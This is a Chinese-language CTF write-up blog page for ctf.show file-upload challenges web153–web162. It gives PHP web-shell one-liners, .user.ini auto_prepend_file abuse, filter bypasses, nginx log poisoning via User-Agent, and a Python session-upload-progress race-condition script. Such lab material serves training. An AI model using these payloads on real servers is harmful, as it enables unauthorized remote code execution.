@@ -1,0 +1,782 @@
+
+
+<!DOCTYPE html>
+<html lang="zh-CN" data-default-color-scheme=auto>
+
+
+
+<head>
+  <meta charset="UTF-8">
+
+  <link rel="apple-touch-icon" sizes="76x76" href="/img/fluid.png">
+  <link rel="icon" href="/img/fluid.png">
+  
+
+  <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0, shrink-to-fit=no">
+  <meta http-equiv="x-ua-compatible" content="ie=edge">
+  
+  <meta name="theme-color" content="#2f4154">
+  <meta name="author" content="MaskObito">
+  <meta name="keywords" content="">
+  
+    <meta name="description" content="web153 .user.ini 的作用：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。 核心指令：auto_prepend_file（在PHP文件前包含）和 auto_append_file（在PHP文件后包含）。 妙用：利用这个机制，将一个非PHP格式的文件（如图片）强制作为PHP代码来执行，从而绕过上传限制。 关键条件：目录下必须有一个可被访问执行的PHP文件（如i">
+<meta property="og:type" content="article">
+<meta property="og:title" content="文件上传">
+<meta property="og:url" content="http://maskobito.github.io/2025/05/06/CTF-%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/index.html">
+<meta property="og:site_name" content="MaskObito">
+<meta property="og:description" content="web153 .user.ini 的作用：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。 核心指令：auto_prepend_file（在PHP文件前包含）和 auto_append_file（在PHP文件后包含）。 妙用：利用这个机制，将一个非PHP格式的文件（如图片）强制作为PHP代码来执行，从而绕过上传限制。 关键条件：目录下必须有一个可被访问执行的PHP文件（如i">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://maskobito.github.io/images/02a295ad4b5f52df2811e78b3dc63672.png">
+<meta property="og:image" content="http://maskobito.github.io/images/0f8e0b29-fee8-434b-98c1-849ff859e21b.png">
+<meta property="og:image" content="http://maskobito.github.io/images/52f22e53866051c2e73ef58809f8a8e9.png">
+<meta property="og:image" content="http://maskobito.github.io/images/881f5bde9c030408a38679a8351a72f6.png">
+<meta property="og:image" content="http://maskobito.github.io/images/d6bc3eb2d69dbdebc785f2755e4b9a93.png">
+<meta property="og:image" content="http://maskobito.github.io/images/c56dd2fe-4e41-4b3c-a83a-eeb5425bcdd2.png">
+<meta property="og:image" content="http://maskobito.github.io/images/82338ce0-fff8-45b5-a0c9-5314553b8ce8.png">
+<meta property="article:published_time" content="2025-05-06T13:40:11.000Z">
+<meta property="article:modified_time" content="2025-09-24T06:54:03.172Z">
+<meta property="article:author" content="John Doe">
+<meta property="article:tag" content="CTF靶场">
+<meta name="twitter:card" content="summary_large_image">
+<meta name="twitter:image" content="http://maskobito.github.io/images/02a295ad4b5f52df2811e78b3dc63672.png">
+  
+  
+  
+  <title>文件上传 - MaskObito</title>
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/twitter-bootstrap/4.6.1/css/bootstrap.min.css" />
+
+
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/github-markdown-css/4.0.0/github-markdown.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/hint.css/2.7.0/hint.min.css" />
+
+  <link  rel="stylesheet" href="https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.css" />
+
+
+
+<!-- 主题依赖的图标库，不要自行修改 -->
+<!-- Do not modify the link that theme dependent icons -->
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1749284_5i9bdhy70f8.css">
+
+
+
+<link rel="stylesheet" href="//at.alicdn.com/t/c/font_1736178_k526ubmyhba.css">
+
+
+<link  rel="stylesheet" href="/css/main.css" />
+
+
+  <link id="highlight-css" rel="stylesheet" href="/css/highlight.css" />
+  
+    <link id="highlight-css-dark" rel="stylesheet" href="/css/highlight-dark.css" />
+  
+
+
+
+  
+<link rel="stylesheet" href="/css/neon.css">
+
+
+
+  <script id="fluid-configs">
+    var Fluid = window.Fluid || {};
+    Fluid.ctx = Object.assign({}, Fluid.ctx)
+    var CONFIG = {"hostname":"maskobito.github.io","root":"/","version":"1.9.8","typing":{"enable":true,"typeSpeed":70,"cursorChar":"_","loop":false,"scope":[],"type":"particle"},"anchorjs":{"enable":true,"element":"h1,h2,h3,h4,h5,h6","placement":"left","visible":"hover","icon":""},"progressbar":{"enable":true,"height_px":3,"color":"#29d","options":{"showSpinner":false,"trickleSpeed":100}},"code_language":{"language":"zh-CN","enable":true,"default":"TEXT"},"copy_btn":true,"image_caption":{"enable":true},"image_zoom":{"enable":true,"img_url_replace":["",""]},"toc":{"enable":true,"placement":"right","headingSelector":"h1,h2,h3,h4,h5,h6","collapseDepth":0},"lazyload":{"enable":true,"loading_img":"/img/loading.gif","onlypost":false,"offset_factor":2},"web_analytics":{"enable":true,"follow_dnt":true,"baidu":null,"google":{"measurement_id":null},"tencent":{"sid":null,"cid":null},"leancloud":{"app_id":null,"app_key":null,"server_url":null,"path":"window.location.pathname","ignore_local":false},"umami":{"src":null,"website_id":null,"domains":null,"start_time":"2024-01-01T00:00:00.000Z","token":null,"api_server":null}},"search_path":"/local-search.xml","include_content_in_search":true};
+
+    if (CONFIG.web_analytics.follow_dnt) {
+      var dntVal = navigator.doNotTrack || window.doNotTrack || navigator.msDoNotTrack;
+      Fluid.ctx.dnt = dntVal && (dntVal.startsWith('1') || dntVal.startsWith('yes') || dntVal.startsWith('on'));
+    }
+  </script>
+  <script  src="/js/utils.js" ></script>
+  <script  src="/js/color-schema.js" ></script>
+  
+
+  
+
+  
+
+  
+
+  
+
+  
+
+
+
+  
+<meta name="generator" content="Hexo 7.3.0"></head>
+
+
+<body>
+  
+
+  <header>
+    
+
+<div class="header-inner" style="height: 70vh;">
+  <nav id="navbar" class="navbar fixed-top  navbar-expand-lg navbar-dark scrolling-navbar">
+  <div class="container">
+    <a class="navbar-brand" href="/">
+      <strong class="navbar-title">MaskObito</strong>
+    </a>
+
+    <button id="navbar-toggler-btn" class="navbar-toggler" type="button" data-toggle="collapse"
+            data-target="#navbarSupportedContent"
+            aria-controls="navbarSupportedContent" aria-expanded="false" aria-label="Toggle navigation">
+      <div class="animated-icon"><span></span><span></span><span></span></div>
+    </button>
+
+    <!-- Collapsible content -->
+    <div class="collapse navbar-collapse" id="navbarSupportedContent">
+      <ul class="navbar-nav ml-auto text-center">
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/" target="_self">
+                <i class="iconfont icon-home-fill"></i>
+                <span>首页</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/archives/" target="_self">
+                <i class="iconfont icon-archive-fill"></i>
+                <span>归档</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/categories/" target="_self">
+                <i class="iconfont icon-category-fill"></i>
+                <span>信息安全</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/tags/" target="_self">
+                <i class="iconfont icon-tags-fill"></i>
+                <span>CTF</span>
+              </a>
+            </li>
+          
+        
+          
+          
+          
+          
+            <li class="nav-item">
+              <a class="nav-link" href="/about/" target="_self">
+                <i class="iconfont icon-user-fill"></i>
+                <span>关于本站</span>
+              </a>
+            </li>
+          
+        
+        
+          <li class="nav-item" id="search-btn">
+            <a class="nav-link" target="_self" href="javascript:;" data-toggle="modal" data-target="#modalSearch" aria-label="Search">
+              <i class="iconfont icon-search"></i>
+            </a>
+          </li>
+          
+        
+        
+          <li class="nav-item" id="color-toggle-btn">
+            <a class="nav-link" target="_self" href="javascript:;" aria-label="Color Toggle">
+              <i class="iconfont icon-dark" id="color-toggle-icon"></i>
+            </a>
+          </li>
+        
+      </ul>
+    </div>
+  </div>
+</nav>
+
+  
+
+<div id="banner" class="banner" parallax=true
+     style="background: url('/img/1.jpg') no-repeat center center; background-size: cover;">
+  <div class="full-bg-img">
+    <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
+      <div class="banner-text text-center fade-in-up">
+        <div class="h2">
+          
+            <span id="subtitle" data-typed-text="文件上传"></span>
+          
+        </div>
+
+        
+          
+  <div class="mt-3">
+    
+    
+      <span class="post-meta">
+        <i class="iconfont icon-date-fill" aria-hidden="true"></i>
+        <time datetime="2025-05-06 21:40" pubdate>
+          2025年5月6日 晚上
+        </time>
+      </span>
+    
+  </div>
+
+  <div class="mt-1">
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-chart"></i>
+        
+          1.7k 字
+        
+      </span>
+    
+
+    
+      <span class="post-meta mr-2">
+        <i class="iconfont icon-clock-fill"></i>
+        
+        
+        
+          15 分钟
+        
+      </span>
+    
+
+    
+    
+  </div>
+
+
+        
+      </div>
+
+      
+    </div>
+  </div>
+</div>
+
+</div>
+
+  </header>
+
+  <main>
+    
+      
+
+<div class="container-fluid nopadding-x">
+  <div class="row nomargin-x">
+    <div class="side-col d-none d-lg-block col-lg-2">
+      
+
+    </div>
+
+    <div class="col-lg-8 nopadding-x-md">
+      <div class="container nopadding-x-md" id="board-ctn">
+        <div id="board">
+          <article class="post-content mx-auto">
+            <h1 id="seo-header">文件上传</h1>
+            
+            
+              <div class="markdown-body">
+                
+                <h3 id="web153"><a href="#web153" class="headerlink" title="web153"></a>web153</h3><ul>
+<li><strong>.user.ini 的作用</strong>：它是一个“目录级”的配置文件，可以自动影响该目录下所有PHP文件的行为。</li>
+<li><strong>核心指令</strong>：<code>auto_prepend_file</code>（在PHP文件<strong>前</strong>包含）和 <code>auto_append_file</code>（在PHP文件<strong>后</strong>包含）。</li>
+<li><strong>妙用</strong>：利用这个机制，<strong>将一个非PHP格式的文件（如图片）强制作为PHP代码来执行</strong>，从而绕过上传限制。</li>
+<li><strong>关键条件</strong>：<strong>目录下必须有一个可被访问执行的PHP文件</strong>（如index.php）来作为“触发器”。</li>
+</ul>
+<figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-attr">auto_prepend_file</span>=shell.png<br></code></pre></td></tr></table></figure>
+
+<p>只需上传shell.png(一句话木马),再通过bp改包上传ini即可</p>
+<h3 id="web154"><a href="#web154" class="headerlink" title="web154"></a>web154</h3><h4 id="关于PHP短标签和分号的说明"><a href="#关于PHP短标签和分号的说明" class="headerlink" title="关于PHP短标签和分号的说明"></a>关于PHP短标签和分号的说明</h4><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?</span> ... <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这是最原始的短标签形式，可以用来包含任何PHP代码。不过默认是关闭的，需要在 php.ini 文件中将 short_open_tag 设置为 On 才能使用</p>
+<p>在PHP中，短标签<code>&lt;?=</code>是<code>&lt;?php echo</code>的简写形式，用于快速输出内容。</p>
+<p>同153，加了个文件内容过滤了php，可用短标签代替</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>连接后看见源码如下</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-comment">//upload.php</span><br><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">error_reporting</span>(<span class="hljs-number">0</span>);<br><span class="hljs-keyword">if</span> (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>] &gt; <span class="hljs-number">0</span>)<br>&#123;<br>	<span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;error&quot;</span>]);<br>&#125;<br><span class="hljs-keyword">else</span><br>&#123;<br>    <span class="hljs-variable">$filename</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>];<span class="hljs-comment">//获取文件名</span><br>    <span class="hljs-variable">$filesize</span> = (<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;size&quot;</span>] / <span class="hljs-number">1024</span>);<span class="hljs-comment">//获取文件大小</span><br>    <span class="hljs-keyword">if</span>(<span class="hljs-variable">$filesize</span>&gt;<span class="hljs-number">1024</span>)&#123;<br>    	<span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">1</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件超过1024KB&quot;</span>);<span class="hljs-comment">//限制文件大小</span><br>    &#125;<span class="hljs-keyword">else</span>&#123;<br>    	<span class="hljs-keyword">if</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;file&#x27;</span>][<span class="hljs-string">&#x27;type&#x27;</span>] == <span class="hljs-string">&#x27;image/png&#x27;</span>)&#123;<span class="hljs-comment">//检查MIME类型是否为png图像类型</span><br>            <span class="hljs-variable">$arr</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$filename</span>);<span class="hljs-comment">//获取文件名的信息。</span><br>            <span class="hljs-variable">$ext_suffix</span> = <span class="hljs-variable">$arr</span>[<span class="hljs-string">&#x27;extension&#x27;</span>];<span class="hljs-comment">//取出文件的扩展名</span><br>            <span class="hljs-keyword">if</span>(<span class="hljs-variable">$ext_suffix</span>!=<span class="hljs-string">&#x27;php&#x27;</span>)&#123;<br>                <span class="hljs-variable">$content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]);<span class="hljs-comment">//获取文件上传的内容</span><br>                <span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">strrpos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)==<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//弱比较</span><br>                    <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<span class="hljs-comment">//如果内容中不包含php，则成功上传</span><br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">0</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br>                &#125;<span class="hljs-keyword">else</span>&#123;<br>                    <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">3</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件内容不合规&quot;</span>);<br>                &#125;<br>                <br>            &#125;<span class="hljs-keyword">else</span>&#123;<br>                <span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>            &#125;<br>    		<br>    	&#125;<span class="hljs-keyword">else</span>&#123;<br>    		<span class="hljs-variable">$ret</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;code&quot;</span>=&gt;<span class="hljs-number">2</span>,<span class="hljs-string">&quot;msg&quot;</span>=&gt;<span class="hljs-string">&quot;文件类型不合规&quot;</span>);<br>    	&#125;<br>    	<br>    &#125;<br><br>&#125;<br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>(<span class="hljs-variable">$ret</span>);<br></code></pre></td></tr></table></figure>
+
+<h3 id="web155"><a href="#web155" class="headerlink" title="web155"></a>web155</h3><p>web155和web154的区别在于upload.php对于字符检测所使用的函数不同 两段代码的主要差异在于检查文件内容是否包含“php”字符串时使用的函数：154代码使用 <em>strrpos($content, “php”) &#x3D;&#x3D; FALSE：</em> strrpos 查找字符串中“php”最后一次出现的位置（区分大小写），返回位置索引或 FALSE。 如果文件内容中包含“php”（如 &lt;?php），strrpos 返回非 FALSE，导致上传失败，返回错误代码 code&#x3D;&gt;3 和消息“文件内容不合规”。 155代码使用 <em>stripos($content, “php”) &#x3D;&#x3D;&#x3D; FALSE：</em> stripos 类似 strrpos，但不区分大小写，查找“php”第一次出现的位置。 使用严格比较 &#x3D;&#x3D;&#x3D; FALSE，检查是否完全没有找到“php”（如 PHP 或 php）。 如果文件内容包含“php”或“PHP”，上传失败，返回错误代码 code&#x3D;&gt;2 和消息“文件类型不合规”。 如果154使用php短标签，则可以通杀这道题</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">stripos</span>(<span class="hljs-variable">$content</span>, <span class="hljs-string">&quot;php&quot;</span>)===<span class="hljs-literal">FALSE</span>)&#123;<span class="hljs-comment">//强比较</span><br>                   <span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>], <span class="hljs-string">&quot;upload/&quot;</span>.<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;name&quot;</span>]);<br></code></pre></td></tr></table></figure>
+
+<p><img src="/../images/02a295ad4b5f52df2811e78b3dc63672.png" srcset="/img/loading.gif" lazyload alt="02a295ad4b5f52df2811e78b3dc63672"></p>
+<h3 id="web156"><a href="#web156" class="headerlink" title="web156"></a>web156</h3><p>上传 1.png</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> @<span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[cmd]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>提示文件类型不合规,猜测是检测到了敏感字符,发现是过滤了[]</p>
+<p>使用{}绕过</p>
+<p>也可以使用<code>filter_input</code>绕过。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>));<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web157"><a href="#web157" class="headerlink" title="web157"></a>web157</h3><p>过滤了；</p>
+<p>关于短标签分号的使用</p>
+<ol>
+<li><p><strong>如果一个PHP语句是代码块中的最后一个语句，并且它后面紧跟着 ?&gt; 结束标签，那么这个语句末尾的分号 ; 可以被省略。</strong></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-string">&quot;Hello World&quot;</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+</li>
+<li><p>当有多个表达式需要输出时，需要使用分号分隔</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span> <span class="hljs-variable">$var1</span>; <span class="hljs-keyword">echo</span> <span class="hljs-string">&quot; &quot;</span>; <span class="hljs-keyword">echo</span> <span class="hljs-variable">$var2</span> <span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure></li>
+</ol>
+<p> 所以这题短标签末尾不用;</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">eval</span>(<span class="hljs-title function_ invoke__">filter_input</span>(INPUT_POST, <span class="hljs-string">&#x27;cmd&#x27;</span>))<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>或者换个语句直接输出flag</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>@<span class="hljs-title function_ invoke__">system</span>(<span class="hljs-string">&quot;tac ../flag.*&quot;</span>)<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web159"><a href="#web159" class="headerlink" title="web159"></a>web159</h3><p>绕过（）   可用反引号, 当 PHP 遇到反引号中的内容时,它会尝试将反引号内的字符串作为 shell 命令执行。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span>`tac ../flag*`<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<h3 id="web160"><a href="#web160" class="headerlink" title="web160"></a>web160</h3><p>绕过log和反引号和空格，尝试用日志包含。</p>
+<p>日志包含攻击是一种利用本地文件包含(LFI)漏洞的技术：</p>
+<ol>
+<li>攻击者向服务器发送包含PHP代码的请求</li>
+<li>服务器将这些请求记录到日志文件中</li>
+<li>攻击者利用LFI漏洞包含日志文件</li>
+<li>服务器执行日志文件中的PHP代码，导致远程代码执行</li>
+</ol>
+<p>写法是为了绕过一些简单的字符串过滤，将log和access.log字符串拼接起来。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?=</span><span class="hljs-keyword">include</span><span class="hljs-string">&#x27;/var/l&#x27;</span>.<span class="hljs-string">&#x27;og/nginx/access.lo&#x27;</span>.<span class="hljs-string">&#x27;g&#x27;</span><span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>加上ua头：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php">User-Agent: <span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这个ua请求会被Nginx记录到access.log中，所以access.log文件中就包含了</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p>这段代码。</p>
+<p>直接连接即可</p>
+<p>注意：include后不可加空格，前后引号保持一致。</p>
+<h3 id="web161"><a href="#web161" class="headerlink" title="web161"></a>web161</h3><p>有真正的图片验证</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">if</span>(<span class="hljs-title function_ invoke__">getimagesize</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&quot;file&quot;</span>][<span class="hljs-string">&quot;tmp_name&quot;</span>]))&#123;<br></code></pre></td></tr></table></figure>
+
+<p>bp上传时会检测文件头，加上GIF89a即可</p>
+<p><img src="/../images/0f8e0b29-fee8-434b-98c1-849ff859e21b.png" srcset="/img/loading.gif" lazyload alt="0f8e0b29-fee8-434b-98c1-849ff859e21b"></p>
+<h3 id="web162"><a href="#web162" class="headerlink" title="web162"></a>web162</h3><p>过滤了.</p>
+<p>因为\x2e要想被解析成.得在字符串里面使用，只能换方法</p>
+<h4 id="法一：session条件竞争"><a href="#法一：session条件竞争" class="headerlink" title="法一：session条件竞争"></a>法一：session条件竞争</h4><p>因为没办法用. 想到session在临时目录下不需要.  php中唯一能控制的无后缀的只有session文件</p>
+<p>如果从cookie里添加PHPSESSID，值为aaa，临时目录下会生成文件**&#x2F;tmp&#x2F;sess_aaa**。</p>
+<p>因为<strong>PHP_SESSION_UPLOAD_PROGRESS</strong>上传完成后，会清空session中的内容，所以要利用条件竞争，不断上传，不断访问</p>
+<p>先正常上传user.ini</p>
+<p><img src="/../images/52f22e53866051c2e73ef58809f8a8e9.png" srcset="/img/loading.gif" lazyload alt="52f22e53866051c2e73ef58809f8a8e9"></p>
+<p>上传文件，名字为1</p>
+<p><img src="/../images/881f5bde9c030408a38679a8351a72f6.png" srcset="/img/loading.gif" lazyload alt="881f5bde9c030408a38679a8351a72f6"></p>
+<p>写条件竞争脚本</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> threading<br><span class="hljs-keyword">import</span> re<br><br>session = requests.session()<br>sess = <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 之前上传时自拟的名字，对应图片内容中的sess_abc</span><br>url1 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show&quot;</span>  <span class="hljs-comment"># 注意修改</span><br>url2 = <span class="hljs-string">&quot;http://58245caf-77db-4386-8f04-3a3536cfed7f.challenge.ctf.show/upload&quot;</span><br>data1 = &#123;<br>    <span class="hljs-string">&#x27;PHP_SESSION_UPLOAD_PROGRESS&#x27;</span>: <span class="hljs-string">&#x27;&lt;?php system(&quot;tac ../f*&quot;);?&gt;&#x27;</span><br>&#125;<br>file = &#123;<br>    <span class="hljs-string">&#x27;file&#x27;</span>: <span class="hljs-string">&#x27;abc&#x27;</span>  <span class="hljs-comment"># 文件名，随便改就行</span><br>&#125;<br>cookies = &#123;<br>    <span class="hljs-string">&#x27;PHPSESSID&#x27;</span>: sess<br>&#125;<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">write</span>():  <span class="hljs-comment"># 上传文件竞争过程</span><br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:<br>        r = session.post(url1, data=data1, files=file, cookies=cookies)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">read</span>():<br>    <span class="hljs-keyword">while</span> <span class="hljs-literal">True</span>:  <span class="hljs-comment"># 每次竞争完都访问一下url/upload看有没有flag</span><br>        r = session.get(url2)<br>        <span class="hljs-keyword">if</span> <span class="hljs-string">&#x27;flag&#x27;</span> <span class="hljs-keyword">in</span> r.text:<br>            flag = re.<span class="hljs-built_in">compile</span>(<span class="hljs-string">&#x27;ctfshow&#123;.+&#125;&#x27;</span>)  <span class="hljs-comment"># flag格式匹配</span><br>            <span class="hljs-built_in">print</span>(flag.findall(r.text))<br><br><br>threads = [threading.Thread(target=write),<br>           threading.Thread(target=read)]<br><span class="hljs-keyword">for</span> t <span class="hljs-keyword">in</span> threads:<br>    t.start()<br></code></pre></td></tr></table></figure>
+
+<p>稍等片刻得到flag</p>
